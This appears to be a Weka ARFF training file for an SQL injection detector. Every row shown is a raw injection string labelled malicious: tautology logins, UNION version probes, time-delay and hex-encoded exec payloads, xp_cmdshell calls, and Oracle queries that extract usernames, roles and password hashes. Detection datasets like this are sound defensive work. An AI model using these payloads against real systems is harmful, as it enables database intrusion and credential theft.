@relation iris-weka.filters.unsupervised.attribute.NominalToString-C1-weka.filters.unsupervised.attribute.NumericToNominal-R2

@attribute Query string
@attribute Label {1,0}

@data
'\"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay \"0:0:2\" --\"',1
'\" select * from users where id  =  \"1\" + @<@# union select 1,version  (    )   -- 1\"\"',1
' or 2 between 1 and 3',1
'union all select @@version--',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND \"i\"  =  \"i\"',1
't\"exec master..xp_cmdshell \"nslookup www.google.com\"--',1
'\"\"\" or isNULL  (  1/0  )   /*\"',1
'\" select * from users where id  =  \"1\" + $+*$ union select 1,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1 or \"\"{?\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"{#\"\" or 1  =  1 -- 1\"',1
'declare @q nvarchar   (  200  )   0x730065006c00650063 ...',1
' or \"a\"  =  \"a',1
' union all select @@version--',1
'\" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1\"',1
'\"admin\"\" or 1  =  1/*\"',1
' or   (  EXISTS  ) ',1
'\" select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1\"',1
'declare @s varchar   (  8000  )   select @s   =   0x73656c ...',1
'\" select * from users where id  =  \"1\" union select +#,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\".;\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 union select 1 1a,version  (    )   -- 1\"',1
'; begin declare @var varchar  (  8000  )   set @var  =  \":\" select @var  =  @var+\"+login+\"/\"+password+\" \" from users where login >',1
'\" union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --\"',1
'hi\" or 1  =  1 --',1
' UNION SELECT',1
'select * from users where id  =  1 \%  (  $  )   or 1  =  1 -- 1',1
'\" select * from users where id  =  1 or 1#\"\"  (   union select \"a\",version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\"{  )  \"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"1[\"\" or 1  =  1 -- 1\"',1
desc,1
'\" select * from users where id  =  1 or \"\",  )  \"\"  =  1 or 1  =  1 -- 1\"',1
'anything\" or \"x\"  =  \"x',1
'\" select * from users where id  =  1 or 1#\"\"1 union select 1,version  (    )   -- 1\"',1
'select * from users where id  =  1 + +\% or 1  =  1 -- 1',1
'0x770061006900740066006F0072002000640065006C00 ...',1
'\" select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1\"',1
'\" select * from users where id  =  \"1\" or $<. union select 1,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1 or \"\"].\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"_;\"\" or 1  =  1 -- 1\"',1
'or isNULL  (  1/0  )   /*',1
'\"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  \"',1
'\" select * from users where id  =  1 or \"\"  )    (  \"\"  =  1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"$@\"\" or 1  =  1 -- 1\"',1
'\"admin\"\" or \"\"1\"\"  =  \"\"1\"\"#\"',1
'\"admin\"\" or 1  =  1--\"',1
' or user like \"\%',1
'admin\"  )   or \"1\"  =  \"1',1
'\"\"\" or sleep  (  __TIME__  )  #\"',1
'\" select * from users where id  =  1 or \"\"  )  $\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"?\%\"\" or 1  =  1 -- 1\"',1
'select * from users where id  =  \"1\" + $+\%$ or 1  =  1 -- 1\"',1
' or \"\"-\"',1
'\" select * from users where id  =  \"1\" union select .#,@@VERSION -- 1\"\"',1
'admin\"  )   or \"1\"  =  \"1\"/*',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 or \"\"@?\"\" or 1  =  1 -- 1\"',1
'select * from users where id  =  1 <@$ or 1  =  1 -- 1',1
'x\" or 1  =  1 or \"x\"  =  \"y',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 union select 1 $,version  (    )   -- 1\"',1
'  )   or   (  \"x\"  )    =    (  \"x',1
' ( ',1
'\" select * from users where id  =  1 or 1#\"\"  (   union select version  (    )  ,version  (    )   -- 1\"',1
'\" select * from users where id  =  1.\%@ union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 +$+ union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  \"1\" union select .,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1 or 1#\"\"@ union select null,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 +$+. union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1\"',1
' )    )    or sleep  (  __TIME__  )    =  \"',1
'having 1  =  1--',1
!,1
'select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1',1
' group by userid having 1  =  1--',1
'\" select * from users where id  =  \"1\" or @ 1  =  1 union select 1,version  (    )   -- 1\"\"',1
'\" select * from users where id  =  1 or 1#\"\"; union select 1,version  (    )   -- 1\"',1
'or 0  =  0 --',1
' or 0  =  0 #',1
'or pg_sleep  (  __TIME__  )  --',1
'or \"1\"  =  \"1\"--',1
'\" select * from users where id  =  1 or 1#\"\"1 union select \"a\",version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\".  =  1 union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or @#\"\"{  =  1 union select 1,version  (    )   -- 1\"',1
' AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND \"i\"  =  \"i',1
sqlvuln,1
'\" select * from users where id  =  1 or \"\".{\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\"; union select \"a\",version  (    )   -- 1\"',1
'0x730065006c0065006300740020004000400076006500 ...',1
'\" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1\"',1
'\" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1\"',1
'declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e',1
'select * from users where id  =  \"1\" or <$ or 1  =  1 -- 1\"',1
' or \"\"&\"',1
'\" select * from users where id  =  1 or \"\"?_\"\" or 1  =  1 -- 1\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  \"1\" union select .\%1,@@VERSION -- 1\"\"',1
' or username like char  (  37  )  ;',1
'\" select * from users where id  =  1 or 1#\"\"$ union select version  (    )  ,version  (    )   -- 1\"',1
'or \"something\"   =   \"some\"+\"thing\"',1
#NAME?,1
'or 1 in   (  select @@version  )  --',1
'declare @q nvarchar   (  4000  )   select @q   = ',1
'\" select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 or \"\"@  (  \"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\"  (  1\"\" or 1  =  1 -- 1\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  1   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1\"',1
'\" select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1\"',1
'admin\"  )   or   (  \"1\"  =  \"1\"#',1
'or a   =   a',1
'select * from users where id  =  \"1\" or !<@ or 1  =  1 -- 1\"',1
'; or \"1\"  =  \"1\"',1
'declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ',1
'\"admin\"\" #\"',1
'select * from users where id  =  1 \%  (  1  )   or 1  =  1 -- 1',1
'\" select * from users where id  =  \"1\" or <   =  1 union select 1,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1 or @#\"\"  (    =  1 or 1  =  1 -- 1\"',1
'; begin declare @var varchar  (  8000  )   set @var  =  \" ...',1
'select * from users where id  =  1 + +\%$ or 1  =  1 -- 1',1
' )   or pg_sleep  (  __TIME__  )  --',1
'PRINT @@variable',1
'\" select * from users where id  =  1 or @#\"\".  =  1 or 1  =  1 -- 1\"',1
'or a  =  a--',1
' or \"x\"  =  \"x',1
'\" select * from users where id  =  1 or \"\"1{\"\" or 1  =  1 -- 1\"',1
'a\" or 1  =  1; --',1
'\" select * from users where id  =  \"1\" or $< union select 1,@@VERSION -- 1\"\"',1
'select * from users where id  =  1 \%  (    )   or 1  =  1 -- 1',1
'\"\"\" or \"\"\"\"-\"\"\"',1
'\%2A\%28\%7C\%28mail\%3D\%2A\%29\%29',1
'\" select * from users where id  =  1 or \"\"  (  _\"\" or 1  =  1 -- 1\"',1
' having 1  =  1--',1
'x\" AND 1  =    (  SELECT COUNT  (  *  )   FROM tabname  )  ; --',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  3   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 or .<$ union select 1,@@VERSION -- 1\"',1
'\"admin\"\"  )   or \"\"1\"\"  =  \"\"1\"\"#\"',1
'  )   or   (  \"a\"  =  \"a',1
'\" select * from users where id  =  1 or 1#\"\"1 union select null,version  (    )   -- 1\"',1
'\" select * from users where id  =  \"1\" union select 1,banner from v$version where rownum  =  1 -- 1\"\"',1
'\"\"\"  )   or   (  \"\"x\"\"  )    =    (  \"\"x\"',1
'union select',1
'23 OR 1  =  1',1
'\" select * from users where id  =  1 or \"\"@;\"\"  =  1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  \"1\" or @  (  1  )    =  1 union select 1,version  (    )   -- 1\"\"',1
'select * from users where id  =  1.<@$ or 1  =  1 -- 1',1
'select * from users where id  =  \"1\" <@&@ or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\";{\"\" or 1  =  1 -- 1\"',1
' or username like \"\%',1
'\"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   \"',1
' or uname like \"\%',1
'declare @s varchar  (  200  )   select @s   =   0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ',1
' or 1 --\"',1
'\" select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  1   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  \"1\" union select +,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1 or \"\"  (  ;\"\" or 1  =  1 -- 1\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND \"i\"  =  \"i\"',1
'select * from users where id  =  1 \%$ . or 1  =  1 -- 1',1
'\"admin\"\"  )   or \"\"1\"\"  =  \"\"1\"\"--\"',1
'1   )    )    or sleep  (  __TIME__  )  #',1
'select * from users where id  =  1 +$ . or 1  =  1 -- 1',1
' (  sqlattempt2  ) ',1
'\" select * from users where id  =  1 *$ . union select null,@@VERSION -- 1\"',1
'x\" and email is NULL; --',1
'\" select * from users where id  =  \"1\" *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1\"\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  8   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 or 1#\"\"@ union select version  (    )  ,version  (    )   -- 1\"',1
'\"1234 \" AND 1  =  0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\"',1
'\" select * from users where id  =  \"1\"<@$$ union select 1,version  (    )   -- 1\"\"',1
'@var select @var as var into temp end --',1
'\" select * from users where id  =  1 +   (  .  )   union select null,@@VERSION -- 1\"',1
' or \"\"  =  \"',1
'\" select * from users where id  =  1 or \"\",&\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"]  )  \"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  \"1\" union select \"\";\"\"_,version  (    )   -- 1\"\"',1
'\"\"\"&\"\"\"',1
'\"\"\"   )    )   ;waitfor delay \"0:0:__TIME__\"--\"',1
'\",s\"',1
'select * from users where id  =  1 +  (    )   or 1  =  1 -- 1',1
'select * from users where id  =  1 or +< or 1  =  1 -- 1',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  7   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 + @`` union select 1,version  (    )   -- 1\"',1
' UNION ALL SELECT',1

